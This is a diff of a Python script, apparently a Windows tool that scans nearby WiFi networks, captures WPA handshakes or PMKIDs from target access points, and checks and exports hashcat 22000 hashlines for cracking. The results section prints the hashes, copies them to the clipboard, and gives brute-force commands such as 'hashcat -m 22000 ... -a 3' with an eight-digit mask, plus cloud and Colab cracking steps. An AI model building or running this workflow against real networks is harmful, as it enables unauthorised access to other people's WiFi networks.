@@ -49,191 +49,261 @@ class CaptureResult:
     error: str = ""
 
 # ============================================================================
-# WiFi扫描（纯netsh，不依赖第三方库）
-# 修复：编码用系统默认(GBK) / signal缺失不丢弃 / 兼容中英文+隐藏SSID
+# netsh通用执行器（自动GBK解码）
 # ============================================================================
-def _run_netsh(args: list) -> str:
-    """运行netsh命令，自动处理编码（GBK优先，UTF-8兜底）"""
+import re as _re
+_MAC_RE = _re.compile(r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-]'
+                       r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}')
+
+def _run_cmd(args: list, timeout: int = 15) -> str:
+    """运行命令，自动用系统编码解码（不硬编码UTF-8）"""
     try:
-        # Windows中文系统netsh输出是GBK/CP936，不是UTF-8
-        r = subprocess.run(
-            ['netsh'] + args,
-            capture_output=True, timeout=15
-        )
-        # 先尝试GBK解码（中文Windows默认）
+        r = subprocess.run(args, capture_output=True, timeout=timeout)
         for enc in ['gbk', 'cp936', 'utf-8', 'latin-1']:
             try:
                 return r.stdout.decode(enc)
-            except (UnicodeDecodeError, AttributeError):
+            except UnicodeDecodeError:
                 continue
         return r.stdout.decode('utf-8', errors='replace')
     except Exception:
         return ''
 
+# ============================================================================
+# 检查无线接口是否存在
+# ============================================================================
+def check_wlan_interface() -> Optional[str]:
+    """检查系统是否存在无线接口，返回接口名或None"""
+    out = _run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
+    if not out or 'wlan' not in out.lower() and 'wi-fi' not in out.lower() and 'wireless' not in out.lower():
+        # 再检查是否有接口名
+        m = _MAC_RE.search(out)
+        if not m and ('没有' in out or 'no wireless' in out.lower() or not out.strip()):
+            return None
+    # 提取接口名
+    for line in out.split('\n'):
+        line_s = line.strip()
+        # 匹配 "名称 : xxx" 或 "Name : xxx"
+        if _re.match(r'^\s*(名称|Name)\s*[:：]', line_s, _re.IGNORECASE):
+            val = line_s.split(':', 1)[-1].strip() if ':' in line_s else line_s.split('：', 1)[-1].strip()
+            if val:
+                return val
+    return 'WLAN'  # 有输出但解析不到名称，返回默认值
+
+# ============================================================================
+# WiFi扫描（不硬编码UTF-8 / signal非必填 / 隐藏SSID保留 / 按bssid去重）
+# ============================================================================
 def scan_wifi() -> List[WiFiNetwork]:
-    """用netsh扫描附近WiFi网络（兼容中英文系统+各种驱动差异）"""
-    import re as _re
-    try:
-        print("    扫描WiFi网络...")
-
-        # MAC地址正则（匹配 aa:bb:cc:dd:ee:ff 或 aa-bb-cc-dd-ee-ff）
-        mac_re = _re.compile(r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}')
-
-        output = ''
-        for attempt in range(3):
-            output = _run_netsh(['wlan', 'show', 'networks', 'mode=bssid'])
-            if not output:
-                print(f"    netsh无输出，等待{3*(attempt+1)}秒重试({attempt+1}/3)...")
-                time.sleep(3 * (attempt + 1))
-                continue
-            # 检查是否有有效内容（BSSID行包含MAC地址）
-            if mac_re.search(output):
-                break
-            if attempt < 2:
-                print(f"    未扫描到网络，等待{3*(attempt+1)}秒重试({attempt+1}/3)...")
-                time.sleep(3 * (attempt + 1))
-
-        if not output:
-            print("    [!] netsh无输出（网卡可能被禁用）")
-            return []
-
-        # ── 解析netsh输出 ──
-        # 关键字兼容：中文/英文/繁体
-        networks = []
-        current_ssid = ''
-        current = {}
-
-        for line in output.split('\n'):
-            line = line.strip()
-            if not line:
-                continue
-
-            # 提取冒号后的值（兼容全角冒号）
-            val = ''
-            if ':' in line:
-                val = line.split(':', 1)[1].strip()
-            elif '：' in line:
-                val = line.split('：', 1)[1].strip()
-
-            line_lower = line.lower()
-
-            # ── SSID行（新条目开始） ──
-            # 匹配: "SSID 1 : xxx" / "SSID 2 : xxx" / "SSID            : xxx"
-            # 不匹配: "BSSID 1 : xx:xx:xx"
-            if _re.match(r'^\s*SSID\s+\d*\s*[:：]', line, _re.IGNORECASE) and 'BSSID' not in line.upper():
-                current_ssid = val
-                # 允许空SSID（隐藏网络）
-                current = {'ssid': current_ssid if current_ssid else '<Hidden>'}
-
-            # ── BSSID行 ──
-            elif 'BSSID' in line.upper():
-                m = mac_re.search(line)
-                if m and 'ssid' in current:
-                    current['bssid'] = m.group(0)
-
-            # ── 安全/身份验证 ──
-            elif any(kw in line for kw in ['身份验证', '驗證', 'Authentication']):
-                if val:
-                    current['security'] = val
-
-            # ── 加密 ──
-            elif any(kw in line for kw in ['加密', '密碼', 'Encryption', 'Cipher']):
-                if val:
-                    current['encryption'] = val
-
-            # ── 信号强度 ──
-            elif any(kw in line for kw in ['信号', '訊號', 'Signal']) and '%' in line:
-                try:
-                    current['signal'] = int(_re.search(r'(\d+)\s*%', line).group(1))
-                except:
-                    pass
-
-            # ── 频道 ──
-            elif any(kw in line for kw in ['频道', '頻道', 'Channel']) and 'GHz' not in line:
-                try:
-                    current['channel'] = int(_re.search(r'(\d+)', val).group(1))
-                except:
-                    pass
-
-            # ── 波段/频率 ──
-            elif any(kw in line for kw in ['波段', 'Band', '頻帶']):
-                if val:
-                    current['band'] = val
-
-            # ── 收集条目：有SSID+BSSID就保存（不强制要求signal） ──
-            if 'ssid' in current and 'bssid' in current:
-                networks.append(WiFiNetwork(
-                    ssid=current.get('ssid', ''),
-                    bssid=current.get('bssid', ''),
-                    signal=current.get('signal', 0),
-                    security=current.get('security', current.get('encryption', '')),
-                    channel=current.get('channel', 0),
-                    band=current.get('band', ''),
-                ))
-                # 保留ssid和security给同SSID下一个BSSID
-                ssid_bak = current.get('ssid', '')
-                sec_bak = current.get('security', '')
-                current = {'ssid': ssid_bak, 'security': sec_bak}
-
-        # 去重（保留信号最强的，signal=0排最后）
-        best = {}
-        for n in networks:
-            key = n.ssid or n.bssid  # 隐藏SSID用BSSID做key
-            if key and (key not in best or n.signal > best[key].signal):
-                best[key] = n
-        result = sorted(best.values(), key=lambda x: x.signal, reverse=True)
-
-        if not result:
-            print(f"    [!] 解析到0个网络（netsh输出{len(output)}字符）")
-            # 打印前几行帮助诊断
-            for i, line in enumerate(output.split('\n')[:10]):
-                print(f"    | {line.rstrip()}")
-
-        return result
-
-    except Exception as e:
-        print(f"  [!] 扫描失败: {e}")
-        import traceback
-        traceback.print_exc()
+    """用netsh扫描WiFi，按bssid去重，signal非必填，隐藏SSID保留"""
+    # 先检查无线接口
+    iface = check_wlan_interface()
+    if not iface:
+        print("  [!] 未检测到无线网卡接口")
+        print("  [!] 请检查: 设备管理器 → 网络适配器 → 是否有WiFi网卡")
         return []
+
+    output = ''
+    for attempt in range(3):
+        output = _run_cmd(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'])
+        if output and _MAC_RE.search(output):
+            break
+        if attempt < 2:
+            w = 3 * (attempt + 1)
+            print(f"  等待扫描刷新({w}秒)...")
+            time.sleep(w)
+
+    if not output or not _MAC_RE.search(output):
+        print("  [!] 未扫描到任何WiFi网络")
+        if output:
+            for line in output.split('\n')[:8]:
+                if line.strip():
+                    print(f"  | {line.rstrip()}")
+        return []
+
+    # ── 纯正则解析：不依赖中英文关键词，只靠结构 ──
+    # netsh输出结构: 每个网络以SSID行开头，后跟若干属性行，BSSID行包含MAC
+    networks = []
+    cur_ssid = ''
+    cur_sec = ''
+    cur = {}
+
+    for line in output.split('\n'):
+        raw = line.rstrip()
+        stripped = raw.strip()
+        if not stripped:
+            continue
+
+        # 分割键值（冒号或全角冒号）
+        kv_val = ''
+        if ':' in stripped:
+            kv_val = stripped.split(':', 1)[1].strip()
+        elif '：' in stripped:
+            kv_val = stripped.split('：', 1)[1].strip()
+
+        upper = stripped.upper()
+
+        # SSID行：以"SSID"开头且不含"BSSID"
+        if _re.match(r'^SSID\s', upper) and 'BSSID' not in upper:
+            cur_ssid = kv_val if kv_val else '<Hidden>'
+            cur_sec = ''
+            cur = {'ssid': cur_ssid}
+            continue
+
+        # BSSID行：包含MAC地址
+        if 'BSSID' in upper:
+            m = _MAC_RE.search(stripped)
+            if m:
+                # 保存上一条（如果有）
+                if 'bssid' in cur and cur.get('ssid'):
+                    networks.append(WiFiNetwork(**cur))
+                cur = {'ssid': cur_ssid, 'bssid': m.group(0), 'signal': 0,
+                       'security': cur_sec, 'channel': 0, 'band': ''}
+            continue
+
+        # 以下只在有bssid的情况下解析属性
+        if 'bssid' not in cur:
+            # 可能是安全类型行（在BSSID之前出现）
+            if '%' not in stripped and not stripped[0:1].isdigit():
+                # 排除信号/频道行，剩下的可能是安全类型
+                if any(kw in stripped for kw in ['WPA', 'WEP', 'Open', '开放', 'PSK', 'Enterprise', '企业']):
+                    cur_sec = kv_val if kv_val else stripped
+            continue
+
+        # 信号行：包含百分号
+        if '%' in stripped:
+            m2 = _re.search(r'(\d+)\s*%', stripped)
+            if m2:
+                cur['signal'] = int(m2.group(1))
+            continue
+
+        # 频道行：纯数字值且<200
+        if kv_val and kv_val.isdigit() and int(kv_val) < 200 and 'channel' not in stripped.lower():
+            # 可能是频道（不依赖关键词，靠值范围判断）
+            cur['channel'] = int(kv_val)
+            continue
+
+        # 频道（关键词匹配兜底）
+        if any(kw in stripped.lower() for kw in ['channel', '频道', '頻道']):
+            m3 = _re.search(r'(\d+)', kv_val)
+            if m3 and int(m3.group(1)) < 200:
+                cur['channel'] = int(m3.group(1))
+            continue
+
+        # 安全类型（如果BSSID之后还有）
+        if any(kw in stripped for kw in ['WPA', 'WEP', 'Open', '开放', 'PSK']):
+            cur['security'] = kv_val if kv_val else stripped
+
+    # 保存最后一条
+    if 'bssid' in cur and cur.get('ssid'):
+        networks.append(WiFiNetwork(**{k: cur.get(k, '' if isinstance(WiFiNetwork.__dataclass_fields__[k].default, str) else 0) for k in WiFiNetwork.__dataclass_fields__}))
+
+    # 修正：简单构建最后一条
+    if 'bssid' in cur and cur.get('ssid') and not any(n.bssid == cur['bssid'] for n in networks):
+        networks.append(WiFiNetwork(
+            ssid=cur.get('ssid', ''), bssid=cur.get('bssid', ''),
+            signal=cur.get('signal', 0), security=cur.get('security', ''),
+            channel=cur.get('channel', 0), band=cur.get('band', '')))
+
+    # 按bssid去重（不是按ssid）
+    seen_bssid = {}
+    for n in networks:
+        if n.bssid and n.bssid not in seen_bssid:
+            seen_bssid[n.bssid] = n
+    return sorted(seen_bssid.values(), key=lambda x: x.signal, reverse=True)
 
 # ============================================================================
 # 获取本机WiFi MAC地址
 # ============================================================================
 def get_local_mac() -> str:
-    """获取本机WiFi网卡MAC地址（多种方式+GBK编码兼容）"""
-    import re as _re
-    mac_re = _re.compile(r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}')
-
-    # 方式1: netsh wlan show interfaces（用GBK解码）
-    out = _run_netsh(['wlan', 'show', 'interfaces'])
+    """获取本机WiFi网卡MAC地址"""
+    # 方式1: netsh wlan show interfaces
+    out = _run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
     for line in out.split('\n'):
         if any(kw in line for kw in ['物理地址', 'Physical address', 'physical address']):
-            m = mac_re.search(line)
+            m = _MAC_RE.search(line)
             if m:
                 return m.group(0).replace(':', '').replace('-', '').lower()
-
     # 方式2: getmac
-    try:
-        r = subprocess.run(['getmac', '/v', '/fo', 'list'], capture_output=True, timeout=5)
-        text = r.stdout.decode('gbk', errors='replace')
-        found = False
-        for line in text.split('\n'):
-            if any(kw in line.lower() for kw in ['wi-fi', 'wlan', 'wireless']):
-                found = True
-            if found:
-                m = mac_re.search(line)
-                if m:
-                    return m.group(0).replace(':', '').replace('-', '').lower()
-    except:
-        pass
-
+    out2 = _run_cmd(['getmac', '/v', '/fo', 'list'], timeout=5)
+    found = False
+    for line in out2.split('\n'):
+        if any(kw in line.lower() for kw in ['wi-fi', 'wlan', 'wireless']):
+            found = True
+        if found:
+            m = _MAC_RE.search(line)
+            if m:
+                return m.group(0).replace(':', '').replace('-', '').lower()
     # 方式3: 手动输入
-    print("    [!] 无法自动获取WiFi MAC地址")
-    mac_input = input("    请输入WiFi MAC地址 (如 aa:bb:cc:dd:ee:ff): ").strip()
+    print("  [!] 无法自动获取WiFi MAC地址")
+    mac_input = input("  请输入WiFi MAC (如 aa:bb:cc:dd:ee:ff): ").strip()
     if mac_input:
         return mac_input.replace(':', '').replace('-', '').lower()
     return "000000000000"
+
+# ============================================================================
+# hashline有效性验证（根据hashcat 22000格式规范）
+# ============================================================================
+def validate_hashline(hashline: str) -> Tuple[bool, str]:
+    """
+    验证hashline是否符合hashcat 22000格式规范
+    返回: (有效, 详细信息)
+    """
+    parts = hashline.strip().split('*')
+
+    # 基本字段数检查
+    if len(parts) < 6:
+        return False, f"字段不足(需>=6, 实际{len(parts)})"
+    if parts[0] != 'WPA':
+        return False, f"头部不是WPA"
+
+    htype = parts[1]
+    issues = []
+
+    if htype == '01':
+        # PMKID: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***MP
+        if len(parts[2]) != 32:
+            issues.append(f"PMKID长度错误({len(parts[2])}!=32)")
+        if len(parts[3]) != 12:
+            issues.append(f"MAC_AP长度错误({len(parts[3])}!=12)")
+        if parts[4] == '000000000000':
+            issues.append("MAC_STA全零(无法验证MIC)")
+        if len(parts[5]) < 2:
+            issues.append("ESSID为空")
+    elif htype == '02':
+        # EAPoL: WPA*02*MIC*MAC_AP*MAC_STA*ESSID*NONCE_AP*EAPOL*MP
+        if len(parts) < 9:
+            return False, f"EAPoL字段不足(需>=9, 实际{len(parts)})"
+        if len(parts[2]) != 32:
+            issues.append(f"MIC长度错误({len(parts[2])}!=32)")
+        if parts[2] == '0' * 32:
+            issues.append("MIC全零(握手包不完整)")
+        if len(parts[3]) != 12:
+            issues.append(f"MAC_AP长度错误({len(parts[3])}!=12)")
+        if parts[4] == '000000000000':
+            issues.append("MAC_STA全零(无法验证MIC,密码不可破)")
+        if len(parts[5]) < 2:
+            issues.append("ESSID为空")
+        if len(parts[6]) != 64:
+            issues.append(f"ANonce长度错误({len(parts[6])}!=64)")
+        if parts[6] == '0' * 64:
+            issues.append("ANonce全零(握手包损坏)")
+        if len(parts[7]) < 100:
+            issues.append(f"EAPoL数据太短({len(parts[7])}字符)")
+    else:
+        return False, f"未知类型({htype})"
+
+    # 解析SSID用于显示
+    ssid = ''
+    try:
+        ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
+    except:
+        ssid = parts[5][:20]
+
+    mac_ap = parts[3] if len(parts) > 3 else ''
+    bssid = ':'.join(mac_ap[i:i+2] for i in range(0, 12, 2)) if len(mac_ap) == 12 else mac_ap
+
+    if issues:
+        return False, f"SSID={ssid} BSSID={bssid} | 问题: {'; '.join(issues)}"
+    return True, f"SSID={ssid} BSSID={bssid} | {'PMKID' if htype=='01' else 'EAPoL M1+M2'} 格式正确"
 
 # ============================================================================
 # 触发EAPOL交换（用随机密码连接目标AP）
@@ -711,79 +781,89 @@ def capture_one(ssid: str, bssid: str) -> CaptureResult:
     return CaptureResult(error=f"两种方式均失败")
 
 def show_results(results: list):
-    """显示捕获结果汇总 + 明确显示.22000文件路径和hashline内容"""
+    """美化结果展示 + hashline有效性验证"""
     print()
-    print("  ════════════════════════════════════════════════")
-    print("  捕获结果汇总")
-    print("  ════════════════════════════════════════════════")
+    print("  ╔══════════════════════════════════════════════════╗")
+    print("  ║              捕 获 结 果 汇 总                  ║")
+    print("  ╠══════════════════════════════════════════════════╣")
 
-    success_count = 0
-    all_hashlines = []
-
+    ok = 0
+    all_hl = []
     for net, r in results:
         if r.success:
-            success_count += 1
-            all_hashlines.append(r.hashline)
-            print(f"  [+] {net.ssid}: 成功 ({r.method})")
-            print(f"      .22000文件: {r.hash_file}")
+            ok += 1
+            all_hl.append(r.hashline)
+            print(f"  ║  ✓ {net.ssid:<20s}  {r.method}")
         else:
-            print(f"  [-] {net.ssid}: 失败 ({r.error})")
+            print(f"  ║  ✗ {net.ssid:<20s}  {r.error[:40]}")
 
-    print(f"\n  成功: {success_count}/{len(results)}")
+    print(f"  ╠══════════════════════════════════════════════════╣")
+    print(f"  ║  成功: {ok}/{len(results)}")
+    print(f"  ╚══════════════════════════════════════════════════╝")
 
-    if all_hashlines:
-        # 合并到一个文件
-        merged_file = os.path.join(CAPTURE_DIR, "all_hashes.22000")
-        with open(merged_file, 'w') as f:
-            for h in all_hashlines:
-                f.write(h + '\n')
-
-        # 明确显示文件路径
+    if not all_hl:
         print()
-        print("  ┌─────────────────────────────────────────┐")
-        print(f"  │  .22000文件: {merged_file}")
-        print("  └─────────────────────────────────────────┘")
+        print("  未成功捕获握手包。建议:")
+        print("  · 安装 Npcap (https://npcap.com) 启用Scapy方式")
+        print("  · 使用 Linux + hcxdumptool 抓包（最可靠）")
+        print("  · 确保以管理员权限运行")
+        return
 
-        # 显示hashline完整内容
-        print()
-        print("  ── hashline内容（复制后用于hashcat破解）──")
-        print()
-        for h in all_hashlines:
-            print(h)
-        print()
+    # 保存文件
+    merged = os.path.join(CAPTURE_DIR, "all_hashes.22000")
+    with open(merged, 'w') as f:
+        for h in all_hl:
+            f.write(h + '\n')
 
-        # 也读取文件验证内容已写入
-        print(f"  验证文件内容:")
-        with open(merged_file, 'r') as f:
-            content = f.read().strip()
-            print(f"  文件行数: {len(content.splitlines())}")
-            print(f"  文件大小: {os.path.getsize(merged_file)} bytes")
+    # hashline有效性验证
+    print()
+    print("  ┌──────────────────────────────────────────────┐")
+    print("  │  Hashline 有效性检查                         │")
+    print("  ├──────────────────────────────────────────────┤")
+    all_valid = True
+    for h in all_hl:
+        valid, info = validate_hashline(h)
+        mark = '✓' if valid else '✗'
+        print(f"  │  {mark} {info}")
+        if not valid:
+            all_valid = False
+    print("  └──────────────────────────────────────────────┘")
 
-        # 复制到剪贴板
-        try:
-            text = '\n'.join(all_hashlines)
-            process = subprocess.Popen(['clip'], stdin=subprocess.PIPE)
-            process.communicate(text.encode('utf-8'))
-            print("\n  [+] hashline已复制到剪贴板!")
-        except:
-            pass
+    if not all_valid:
+        print()
+        print("  ⚠ 部分hashline存在问题，hashcat可能无法破解")
+        print("  · MAC_STA全零 → 需要正确的客户端MAC地址")
+        print("  · MIC/ANonce全零 → 握手包数据不完整")
 
-        print()
-        print("  下一步: 将hashline粘贴到以下工具进行GPU破解:")
-        print("    - Mac本地: bash crack-local.sh")
-        print("    - 云服务器: bash crack.sh")
-        print("    - hashcat:  hashcat -m 22000 all_hashes.22000 -a 3 '?d?d?d?d?d?d?d?d'")
-    else:
-        print()
-        print("  [!] 未成功捕获任何握手包")
-        print("  可能原因:")
-        print("    - 目标AP不支持PMKID（较旧的路由器）")
-        print("    - Windows网卡驱动不支持原始帧捕获")
-        print("    - 未以管理员权限运行")
-        print("  建议:")
-        print("    - 安装Npcap(https://npcap.com)后重试")
-        print("    - 使用Linux/Kali + hcxdumptool捕获")
-        print("    - 在Mac上用wifi-crack-mac的--capture模式")
+    # 显示文件信息
+    print()
+    print(f"  📁 .22000文件: {merged}")
+    print(f"     行数: {len(all_hl)} | 大小: {os.path.getsize(merged)} bytes")
+
+    # 显示hashline内容
+    print()
+    print("  ┌──────────────────────────────────────────────┐")
+    print("  │  Hashline 内容（复制用于hashcat破解）        │")
+    print("  └──────────────────────────────────────────────┘")
+    print()
+    for h in all_hl:
+        print(h)
+    print()
+
+    # 复制到剪贴板
+    try:
+        p = subprocess.Popen(['clip'], stdin=subprocess.PIPE)
+        p.communicate('\n'.join(all_hl).encode('utf-8'))
+        print("  📋 已复制到剪贴板!")
+    except:
+        pass
+
+    print()
+    print("  下一步破解:")
+    print("  · Colab:   粘贴到Notebook的RAW_PASTE中运行")
+    print("  · Mac:     bash crack-local.sh")
+    print("  · 云服务器: bash crack.sh")
+    print(f"  · hashcat: hashcat -m 22000 {merged} -a 3 '?d?d?d?d?d?d?d?d'")
 
 def show_captured_files():
     """显示已捕获的文件"""
